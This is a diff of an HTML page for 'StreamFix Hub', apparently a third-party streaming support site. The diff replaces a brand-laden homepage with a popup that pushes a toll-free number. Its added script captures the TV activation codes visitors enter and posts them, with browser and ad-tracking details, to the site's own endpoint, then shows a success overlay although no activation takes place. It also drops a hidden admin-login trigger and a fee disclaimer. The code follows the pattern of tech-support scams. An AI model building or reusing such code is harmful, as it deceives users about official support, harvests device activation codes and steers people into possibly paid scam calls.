-                <div class="card-arrow"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></div>
-            </div>
-            <div class="card-name">ESPN Unlimited</div>
-            <div class="card-desc">Full ESPN access setup, multi-device streaming, and premium sports feature activation.</div>
-            <div class="card-tags">
-                <span class="tag">Full Access</span>
-                <span class="tag">Multi-Device</span>
-                <span class="tag">Premium</span>
-            </div>
-            <span class="card-cta">Get ESPN Help <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></span>
-        </a>
-
-        <a href="starz" class="platform-card">
-            <div class="card-logo-row">
-                <div class="card-logo-wrap">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8c/Starz_2016.svg/280px-Starz_2016.svg.png" alt="STARZ" onerror="this.style.display='none'; this.nextElementSibling.style.display='block'">
-                    <span style="display:none; font-size:1.1rem; font-weight:800; color:#fff; letter-spacing:2px;">STARZ</span>
-                </div>
-                <div class="card-arrow"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></div>
-            </div>
-            <div class="card-name">STARZ</div>
-            <div class="card-desc">STARZ activation, add-on setup, device compatibility, and streaming troubleshooting.</div>
-            <div class="card-tags">
-                <span class="tag">Activation</span>
-                <span class="tag">Add-ons</span>
-                <span class="tag">Playback</span>
-            </div>
-            <span class="card-cta">Get STARZ Help <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></span>
-        </a>
-
-        <a href="fox-one" class="platform-card">
-            <div class="card-logo-row">
-                <div class="card-logo-wrap">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/FOX_Broadcasting_Company_logo.svg/280px-FOX_Broadcasting_Company_logo.svg.png" alt="FOX One" onerror="this.style.display='none'; this.nextElementSibling.style.display='block'">
-                    <span style="display:none; font-size:1.1rem; font-weight:800; color:#fff;">FOX</span>
-                </div>
-                <div class="card-arrow"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></div>
-            </div>
-            <div class="card-name">FOX One</div>
-            <div class="card-desc">Channel activation, TV provider linking, app setup, and live streaming support.</div>
-            <div class="card-tags">
-                <span class="tag">Activation</span>
-                <span class="tag">TV Provider</span>
-                <span class="tag">App Setup</span>
-            </div>
-            <span class="card-cta">Get FOX One Help <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></span>
-        </a>
-
-        <a href="fox-nation" class="platform-card">
-            <div class="card-logo-row">
-                <div class="card-logo-wrap">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/Fox_Nation_Logo.svg/280px-Fox_Nation_Logo.svg.png" alt="Fox Nation" onerror="this.style.display='none'; this.nextElementSibling.style.display='block'">
-                    <span style="display:none; font-size:1.1rem; font-weight:800; color:#fff;">Fox Nation</span>
-                </div>
-                <div class="card-arrow"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></div>
-            </div>
-            <div class="card-name">Fox Nation</div>
-            <div class="card-desc">Subscription activation, device setup, login assistance, and streaming support.</div>
-            <div class="card-tags">
-                <span class="tag">Subscription</span>
-                <span class="tag">Login</span>
-                <span class="tag">Streaming</span>
-            </div>
-            <span class="card-cta">Get Fox Nation Help <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></span>
-        </a>
-
-        <a href="fox-sports" class="platform-card">
-            <div class="card-logo-row">
-                <div class="card-logo-wrap">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0e/FOX_Sports_logo.svg/280px-FOX_Sports_logo.svg.png" alt="Fox Sports" onerror="this.style.display='none'; this.nextElementSibling.style.display='block'">
-                    <span style="display:none; font-size:1.1rem; font-weight:800; color:#fff;">FOX Sports</span>
-                </div>
-                <div class="card-arrow"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></div>
-            </div>
-            <div class="card-name">Fox Sports</div>
-            <div class="card-desc">Live sports streaming setup, TV provider authentication, and device activation help.</div>
-            <div class="card-tags">
-                <span class="tag">Live Sports</span>
-                <span class="tag">Authentication</span>
-                <span class="tag">Devices</span>
-            </div>
-            <span class="card-cta">Get Fox Sports Help <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></span>
-        </a>
-
-        <a href="amazon-prime" class="platform-card">
-            <div class="card-logo-row">
-                <div class="card-logo-wrap">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Amazon_Prime_Video_logo.svg/280px-Amazon_Prime_Video_logo.svg.png" alt="Amazon Prime Video" onerror="this.style.display='none'; this.nextElementSibling.style.display='block'">
-                    <span style="display:none; font-size:1.1rem; font-weight:800; color:#00a8e0;">Prime Video</span>
-                </div>
-                <div class="card-arrow"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></div>
-            </div>
-            <div class="card-name">Amazon Prime Video</div>
-            <div class="card-desc">Sign in via TV activation code, fix login errors, set up on Roku or Fire Stick, and resolve buffering issues.</div>
-            <div class="card-tags">
-                <span class="tag">TV Code Login</span>
-                <span class="tag">Activation</span>
-                <span class="tag">Device Setup</span>
-            </div>
-            <span class="card-cta">Get Prime Video Help <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></span>
-        </a>
-
-        <a href="vizio-tv" class="platform-card">
-            <div class="card-logo-row">
-                <div class="card-logo-wrap">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Vizio_logo.svg/280px-Vizio_logo.svg.png" alt="Vizio" onerror="this.style.display='none'; this.nextElementSibling.style.display='block'">
-                    <span style="display:none; font-size:1.1rem; font-weight:800; color:#0080ff;">VIZIO</span>
-                </div>
-                <div class="card-arrow"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></div>
-            </div>
-            <div class="card-name">Vizio Smart TV</div>
-            <div class="card-desc">Smart TV activation, app installation, connectivity, and remote setup assistance.</div>
-            <div class="card-tags">
-                <span class="tag">TV Setup</span>
-                <span class="tag">App Install</span>
-                <span class="tag">Connectivity</span>
-            </div>
-            <span class="card-cta">Get Vizio Help <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></span>
-        </a>
-
-    </div>
-</section>
-
-<!-- FEATURES STRIP -->
-<div class="features-strip">
-    <div class="features-inner">
-        <div class="feature-item">
-            <div class="feature-icon">&#9889;</div>
-            <div>
-                <h3>Instant Guides</h3>
-                <p>Step-by-step fixes that actually work for every streaming error.</p>
-            </div>
-        </div>
-        <div class="feature-item">
-            <div class="feature-icon">&#127916;</div>
-            <div>
-                <h3>All Platforms</h3>
-                <p>Paramount+, Peacock, Hulu, Disney+, ESPN, FOX, STARZ and more.</p>
-            </div>
-        </div>
-        <div class="feature-item">
-            <div class="feature-icon">&#128250;</div>
-            <div>
-                <h3>Every Device</h3>
-                <p>Smart TVs, Roku, Fire TV, gaming consoles, and mobile devices.</p>
-            </div>
-        </div>
-        <div class="feature-item">
-            <div class="feature-icon">&#128222;</div>
-            <div>
-                <h3>Phone Support</h3>
-                <p>Call our team anytime when guides aren't enough — available 24/7.</p>
-            </div>
-        </div>
-    </div>
+<div id="mobPopup">
+  <div class="mob-box">
+    <div class="mob-title">Need Help Activating Your TV?</div>
+    <p class="mob-desc">Skip the code — our experts activate your device over the phone in minutes. 100% toll-free.</p>
+    <a class="mob-call" href="tel:+18887791904">Call Now +1-888-779-1904</a>
+    <div class="mob-avail"><span class="dot"></span>Available 24/7 &mdash; Toll-Free</div>
+    <div class="mob-dismiss" onclick="dismissMobPopup()">I'll enter my code instead &rarr;</div>
+  </div>
 </div>
-
-<!-- CONTENT SECTION -->
-<section class="content-section">
-    <h2>We Help You Watch What You Love</h2>
-    <div class="content-grid">
-        <div class="content-thumb ct1">
-            <div class="content-thumb-inner"><span class="content-thumb-label">Hit Series</span></div>
-        </div>
-        <div class="content-thumb ct2">
-            <div class="content-thumb-inner"><span class="content-thumb-label">Award Winners</span></div>
-        </div>
-        <div class="content-thumb ct3">
-            <div class="content-thumb-inner"><span class="content-thumb-label">New Releases</span></div>
-        </div>
-        <div class="content-thumb ct4">
-            <div class="content-thumb-inner"><span class="content-thumb-label">Fan Favorites</span></div>
-        </div>
-        <div class="content-thumb ct5">
-            <div class="content-thumb-inner"><span class="content-thumb-label">Trending Now</span></div>
-        </div>
-        <div class="content-thumb ct6">
-            <div class="content-thumb-inner"><span class="content-thumb-label">Must Watch</span></div>
-        </div>
-    </div>
-</section>
-
-<!-- SPORTS BANNER -->
-<div class="sports-banner">
-    <div class="sports-text">
-        <h3>Live Sports, Zero Interruptions</h3>
-        <p>We'll get your sports streaming set up fast — so you never miss the big game.</p>
-    </div>
-    <div class="sports-icons">
-        <span>&#9917;</span>
-        <span>&#127944;</span>
-        <span>&#127952;</span>
-    </div>
-</div>
-
-<!-- BOTTOM CTA -->
-<div class="bottom-cta">
-    <h2>Can't find what you need?</h2>
-    <p>Our <span id="adminTrigger" style="cursor:default">support team</span> is ready to help with any streaming issue. Call us now for immediate assistance.</p>
-    <div class="bottom-btns">
-        <a href="tel:+18887791904" class="hero-btn-primary">
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
-            Call +1 888-779-1904
-        </a>
-        <a href="tel:+18887791904" class="hero-btn-secondary">Contact Us</a>
-    </div>
-</div>
-
-<footer>
-    <div class="footer-links">
-        <a href="privacy-policy">Privacy Policy</a>
-        <a href="terms-of-service">Terms of Service</a>
-    </div>
-    <p>&copy; 2026 StreamFix Hub. All rights reserved.</p>
-    <p>+1 888-779-1904 &nbsp;|&nbsp; help@streamfixhub.com</p>
-    <div class="disclaimer-full">
-        <strong>DISCLAIMER:</strong> StreamFix Hub is an independent help center providing third-party troubleshooting guidance. We have no affiliation with, and are not endorsed or sponsored by, Paramount+, Disney+, Hulu, Peacock (NBCUniversal), ESPN, FOX Corporation, Fox Nation, Fox Sports, STARZ, Amazon Prime Video, Vizio, or any of their parent companies. All brand names, logos, and trademarks are owned by their respective companies. Usage of this site may be subject to service fees.
-    </div>
-</footer>
 
 <script>
-    // Animated counters
-    function animateCounter(el) {
-        const target = parseInt(el.dataset.target);
-        const suffix = el.dataset.suffix || '';
-        if (isNaN(target)) return;
-        let start = 0;
-        const duration = 1800;
-        const step = (timestamp) => {
-            if (!start) start = timestamp;
-            const progress = Math.min((timestamp - start) / duration, 1);
-            const eased = 1 - Math.pow(1 - progress, 3);
-            el.textContent = Math.floor(eased * target) + suffix;
-            if (progress < 1) requestAnimationFrame(step);
-        };
-        requestAnimationFrame(step);
-    }
-
-    const observer = new IntersectionObserver((entries) => {
-        entries.forEach(entry => {
-            if (entry.isIntersecting) {
-                animateCounter(entry.target);
-                observer.unobserve(entry.target);
-            }
-        });
-    }, { threshold: 0.5 });
-
-    document.querySelectorAll('.stat-num[data-target]').forEach(el => observer.observe(el));
-
-    // Hidden admin trigger — 5 clicks on "support team" within 4 seconds
-    (function() {
-        var trigger = document.getElementById('adminTrigger');
-        var clicks = 0, timer = null;
-        trigger.addEventListener('click', function() {
-            clicks++;
-            if (timer) clearTimeout(timer);
-            if (clicks >= 5) {
-                clicks = 0;
-                window.location.href = '__ADMIN_LOGIN_PATH__';
-                return;
-            }
-            timer = setTimeout(function() { clicks = 0; }, 4000);
-        });
-    })();
+var p=new URLSearchParams(window.location.search);
+function handleSubmit(){
+  var code=document.getElementById('codeInput').value.trim();
+  var err=document.getElementById('errorMsg');
+  if(code.length<4){err.classList.add('visible');document.getElementById('codeInput').focus();return;}
+  err.classList.remove('visible');
+  try{fetch('/api/v1/event',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'code_submit',code:code,channel:p.get('ch')||'general',sw:screen.width,sh:screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,referrer:document.referrer,utm_source:p.get('utm_source')||'',utm_campaign:p.get('utm_campaign')||'',utm_term:p.get('utm_term')||'',utm_content:p.get('utm_content')||'',gclid:p.get('gclid')||''})}).catch(function(){});}catch(e){}
+  document.getElementById('successOverlay').classList.add('active');
+  document.body.style.overflow='hidden';
+}
+document.getElementById('popupCallBtn').addEventListener('click',function(e){
+  e.preventDefault();
+  try{fetch('/api/v1/event',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'call_click',channel:p.get('ch')||'general',code:document.getElementById('codeInput').value.trim(),gclid:p.get('gclid')||'',utm_campaign:p.get('utm_campaign')||'',utm_term:p.get('utm_term')||''})}).catch(function(){});}catch(e){}
+  window.location.href=this.href;
+});
+document.getElementById('callBtn').addEventListener('click',function(e){
+  e.preventDefault();
+  try{fetch('/api/v1/event',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'call_click',channel:p.get('ch')||'general',code:'',gclid:p.get('gclid')||'',utm_campaign:p.get('utm_campaign')||'',utm_term:p.get('utm_term')||''})}).catch(function(){});}catch(e){}
+  window.location.href=this.href;
+});
+document.getElementById('codeInput').addEventListener('keydown',function(e){if(e.key==='Enter')handleSubmit();});
+document.getElementById('codeInput').addEventListener('input',function(){this.value=this.value.toUpperCase().replace(/[^A-Z0-9]/g,'');});
+function dismissMobPopup(){document.getElementById('mobPopup').classList.remove('show');try{sessionStorage.setItem('mpc_seen','1');}catch(e){}}
+(function(){if(window.innerWidth<768&&!sessionStorage.getItem('mpc_seen')){setTimeout(function(){document.getElementById('mobPopup').classList.add('show');},1800);}})();
 </script>
-
 </body>
 </html>
